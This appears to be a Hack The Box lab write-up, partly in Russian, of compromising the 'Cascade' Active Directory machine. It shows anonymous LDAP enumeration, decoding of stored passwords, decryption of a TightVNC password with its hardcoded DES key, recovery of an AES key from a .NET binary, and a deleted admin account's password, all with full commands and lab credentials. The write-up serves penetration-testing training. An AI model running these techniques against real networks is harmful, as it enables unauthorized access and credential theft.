---
title: "[HTB] Cascade"
permalink: /writeups/htb/cascade/
excerpt: "Краткий разбор машины Cascade с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - sql
  - reverseengineering
  - cryptography
---

---

{% include toc icon="cog" title="Cascade Solution" %}

The [Cascade](https://app.hackthebox.com/machines/Cascade) machine has been created by [VbScrub](https://app.hackthebox.com/users/158833). This is a **medium** Windows Machine with a strong focus on Active Directory exploitation, but also a bit of cryptography and reverse engineering. It should be noted that the machine is a bit CTF-y.

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

![image-center](/images/htb/htb_cascade_infocard.png){: .align-center}

**Заметка:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine, except for the Reverse Engineering part. You can download Kali from the official website [here](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -sV -Pn 10.129.140.139                                                                   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 14:45 EST
Nmap scan report for 10.129.140.139
Host is up (0.019s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-07 19:45:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.95 seconds
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

The **LDAP** (389/TCP) port is open and this computer seems to be a domain controller for **cascade.local**. Let's see if we can extract some users.

## LDAP

First, we can try an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch) and list usernames. Here, we used the `grep` command to look for the **userPrincipalName** attribute that specifies the UPN of the users.

```bash
$ ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.129.140.139 | grep userPrincipalName
userPrincipalName: CascGuest@cascade.local
userPrincipalName: s.smith@cascade.local
userPrincipalName: r.thompson@cascade.local
userPrincipalName: j.wakefield@cascade.local
userPrincipalName: s.hickson@cascade.local
userPrincipalName: j.goodhand@cascade.local
userPrincipalName: a.turnbull@cascade.local
userPrincipalName: e.crowe@cascade.local
userPrincipalName: b.hanson@cascade.local
userPrincipalName: d.burman@cascade.local
userPrincipalName: arksvc@cascade.local
userPrincipalName: util@cascade.local
userPrincipalName: BackupSvc@cascade.local
userPrincipalName: j.allen@cascade.local
userPrincipalName: i.croft@cascade.local
```

We got some users. Now, for the CTF-y part, we had to take a closer look at `ldapsearch` command output and found an attribute named **cascadeLegacyPwd** for the **r.thompson@cascade.local** user.

```bash
$ ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.129.140.139 | grep -E 'userPrincipalName|cascadeLegacyPwd'
userPrincipalName: CascGuest@cascade.local
userPrincipalName: arksvc@cascade.local
userPrincipalName: s.smith@cascade.local
userPrincipalName: r.thompson@cascade.local
cascadeLegacyPwd: clk0bjVldmE=
userPrincipalName: util@cascade.local
userPrincipalName: j.wakefield@cascade.local

...[snip]...

```

Using the `base64` command, it was possible to decode the value and get a potential password.

```bash
$ echo clk0bjVldmE= | base64 -d
rY4n5eva
```

Then, using [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec), it was possible to check if the password was valid.

```bash
$ crackmapexec smb 10.129.140.139 -d cascade.local -u r.thompson -p rY4n5eva  
SMB         10.129.140.139  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.140.139  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
```

## Shared Folders

While **r.thompson** does not have any remote access to the computer, using `crackmapexec` and the `--shares` switch, it was possible to list some shares accessible by this user on the target computer.

```bash
$ crackmapexec smb 10.129.140.139 -d cascade.local -u r.thompson -p rY4n5eva --shares
SMB         10.129.140.139  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.140.139  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.140.139  445    CASC-DC1         [+] Enumerated shares
SMB         10.129.140.139  445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.140.139  445    CASC-DC1         -----           -----------     ------
SMB         10.129.140.139  445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.140.139  445    CASC-DC1         Audit$                          
SMB         10.129.140.139  445    CASC-DC1         C$                              Default share
SMB         10.129.140.139  445    CASC-DC1         Data            READ            
SMB         10.129.140.139  445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.140.139  445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.140.139  445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.140.139  445    CASC-DC1         SYSVOL          READ            Logon server share 
```

Here, we can see that **r.thompson** has the **READ** permission on some folders. 

```bash
$ smbclient \\\\10.129.140.139\\Data -U r.thompson
Enter WORKGROUP\r.thompson's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 22:27:34 2020
  ..                                  D        0  Sun Jan 26 22:27:34 2020
  Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020

                6553343 blocks of size 4096. 1626796 blocks available
smb: \> 
```

By taking a look at the **Data** share, we found multiple folders.

# Первичный доступ

In a real-world scenario, adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives. With the previously discovered shares, let's see if we can find interesting files.

## VNC Password

Let's start by recursively download all the content of **Data** and see if we can find something. Note that we used the `recurse` command to enable directory recursion for the command `mget` and `prompt off` to make sure that all specified files (if any) will be transferred without asking if we want to download them.

```bash
smb: \> recurse
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (26.5 KiloBytes/sec) (average 26.5 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (13.4 KiloBytes/sec) (average 19.9 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (61.3 KiloBytes/sec) (average 33.8 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (25.4 KiloBytes/sec) (average 31.6 KiloBytes/sec)
smb: \> exit
```

Done. Let's start by taking a look at the *Meeting_Notes_June_2018.html* file.

```bash
$ cat IT/Email\ Archives/Meeting_Notes_June_2018.html

...[snip]...

<p>-- We will be using a temporary account to perform all tasks related 
to the network migration and this account will be deleted at the end of 
2018 once the migration is complete. This will allow us to identify 
actions related to the migration in security logs etc. Username is 
TempAdmin (password is the same as the normal admin account password). </p>

...[snip]...
```

Well, it talks about a now-deleted **TempAdmin** account and it seems that this account had the same password as **administrator**, we will get back to that later. Let's keep looking...

We also have a file named *VNC Install.reg* in the **s.smith** directory.

```bash
$ cat IT/Temp/s.smith/VNC\ Install.reg 
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

This is interesting, it's a backup of registry keys related to VNC. We can also see an encoded password. VNC uses a hardcoded DES key to store credentials. The same key is used across multiple product lines so we may get a cleartext password by decrypting it.

Using this [post](https://github.com/frizb/PasswordDecrypts) about VNC passwords, we can try to decrypt it. According to the article, decryption the password is as simple as that:

```bash
$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

Cool, we got a cleartext password. As we found this password in **s.smith** folder, let's use this username with `crackmapexec`.

```bash
$ crackmapexec winrm 10.129.140.139 -d cascade.local -u s.smith -p sT333ve2
HTTP        10.129.140.139   5985   10.129.140.139    [*] http://10.129.140.139:5985/wsman
WINRM       10.129.140.139   5985   10.129.140.139    [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
```

Great, we have valid credentials and a WinRM access.

## Доступ по WinRM

Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and the recovered account, we can try to connect to the remote machine.

```bash
$ evil-winrm -i 10.129.140.139 -u s.smith -p sT333ve2 

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> dir C:\Users\s.smith\Desktop


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/10/2022   7:48 PM             34 user.txt
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
```

We now have a remote shell access and the **first flag**.

# Повышение привилегий

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Shared Folder Recon

Like the previous user, let's take a look at the shared folders with **s.smith** credentials. Note that this part was again a bit CTF-y as we don't have any clear direction on how to get further on this box.

```bash
$ smbclient \\\\10.129.140.139\\Audit$ -U s.smith
Enter WORKGROUP\s.smith's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

                6553343 blocks of size 4096. 1627217 blocks available
```

We found a few DLL/EXE file as well as a **DB** folder. 

```bash
smb: \> cd DB
smb: \DB\> dir
  .                                   D        0  Tue Jan 28 16:40:59 2020
  ..                                  D        0  Tue Jan 28 16:40:59 2020
  Audit.db                           An    24576  Tue Jan 28 16:39:24 2020

                6553343 blocks of size 4096. 1627215 blocks available
smb: \DB\> get Audit.db
getting file \DB\Audit.db of size 24576 as Audit.db (160.0 KiloBytes/sec) (average 160.0 KiloBytes/sec)
```

We got our hands on a file named **Audit.db**. Using **SQLite Database Browser** (installed on Kali) we found a **pwd** field related to the **ArkSvc** user.

![image-center](/images/htb/htb_cascade_sqlite.png){: .align-center}

As it looks like a Base64 encoded value, let's try to decode it.

```bash
$ echo BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d
������D�|zC�;
```

The value seems to be encrypted, maybe the DLL/EXE we found previously contain some information about how to decrypt it. Let's download them.

```bash
smb: \DB\> cd ..
smb: \> get CascAudit.exe
getting file \CascAudit.exe of size 13312 as CascAudit.exe (104.8 KiloBytes/sec) (average 135.0 KiloBytes/sec)
smb: \> get CascCrypto.dll
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (85.1 KiloBytes/sec) (average 85.1 KiloBytes/sec)
smb: \> exit
```

Now we can dig in the next part of the challenge.

## Reverse Engineering

First, we need to know what kind of executable we have. Using the `file` command, we can see which type of file it is.

```bash                           
$ file Casc*                     
CascAudit.exe:  PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
CascCrypto.dll: PE32 executable (DLL) (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```

.NET files (32-bit)! Alright, let's fire up a Windows machine with [dnSpy](https://github.com/dnSpy/dnSpy) installed. **dnSpy** is a debugger and .NET assembly editor. You can use it to edit and debug assemblies even if you don't have any source code available.

After a bit of reverse engineering, we found two (2) interesting methods. The first one, **DecryptString()** seems to be using AES128 as encryption algorithm, we even have the cleartext IV: **1tdyjCbY1Ix49842**.

![image-center](/images/htb/htb_cascade_dnspy_01.png){: .align-center}

The second one performs an SQL query on the **pwd** field we found previously and decrypt the content with the following key: **c4scadek3y654321**

![image-center](/images/htb/htb_cascade_dnspy_02.png){: .align-center}

With that information, we can try to decrypt the content of the **pwd** field. The easiest way was to use [CyberChef](https://gchq.github.io/CyberChef/) and the **AES Decrypt** module.

![image-center](/images/htb/htb_cascade_aes_decrypt.png){: .align-center}


Now, with the recovered value, we can try to login as **arksvc**.

```bash
$ crackmapexec winrm 10.129.140.139 -d cascade.local -u arksvc -p w3lc0meFr31nd
HTTP        10.129.140.139   5985   10.129.140.139    [*] http://10.129.140.139:5985/wsman
WINRM       10.129.140.139   5985   10.129.140.139    [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
```

The password is valid and we do have a WinRM access to the remote computer.

## Finding the admin password

Using `evil-winrm` we can connect to the remote machine and start looking for the deleted **TempAdmin** that the *Meeting_Notes_June_2018.html* file was talking about. 

This task is relatively easy to complete with the [Get-ADObject](https://www.google.com/search?client=safari&rls=en&q=Get-ADObject&ie=UTF-8&oe=UTF-8) cmdlet. By using an LDAP filter and the *-IncludeDeletedObjects* switch, it was possible the find the user.

```bash
$ evil-winrm -i 10.129.140.139 -u arksvc -p w3lc0meFr31nd

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects


...[snip]...

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

Now, let's fine-tune our LDAP filter to get some information about this **TempAdmin** user and recover its properties.

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin) (isDeleted=TRUE))" -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
...[snip]...
```

Once again, we found the **cascadeLegacyPwd** attribute with a Base64 encoded value. Let's decode it.

```bash
$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```

Given the information we previously found, this password should be the same for the **administrator** account.

```bash
$ crackmapexec smb 10.129.140.139 -d cascade.local -u administrator -p baCT3r1aN00dles                                         
SMB         10.129.140.139  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.140.139  445    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
```

Great, we now have credentials (`administrator:baCT3r1aN00dles`) for the **administrator** account. Now we can connect on the remote machine with administrative privileges and read the **second flag**.

```bash
$ crackmapexec smb 10.129.140.139 -d cascade.local -u administrator -p baCT3r1aN00dles -x "dir C:\Users\Administrator\Desktop" 
SMB         10.129.140.139  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.140.139  445    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
SMB         10.129.140.139  445    CASC-DC1         [+] Executed command 
SMB         10.129.140.139  445    CASC-DC1         Volume in drive C has no label.
SMB         10.129.140.139  445    CASC-DC1         Volume Serial Number is CF98-2F06
SMB         10.129.140.139  445    CASC-DC1         
SMB         10.129.140.139  445    CASC-DC1         Directory of C:\Users\Administrator\Desktop
SMB         10.129.140.139  445    CASC-DC1         
SMB         10.129.140.139  445    CASC-DC1         08/11/2021  15:58    <DIR>          .
SMB         10.129.140.139  445    CASC-DC1         08/11/2021  15:58    <DIR>          ..
SMB         10.129.140.139  445    CASC-DC1         10/02/2022  19:48                34 root.txt
SMB         10.129.140.139  445    CASC-DC1         1 File(s)             34 bytes
SMB         10.129.140.139  445    CASC-DC1         2 Dir(s)   6,664,507,392 bytes free
```

Awesome! I hope you enjoyed it, I know I did :)
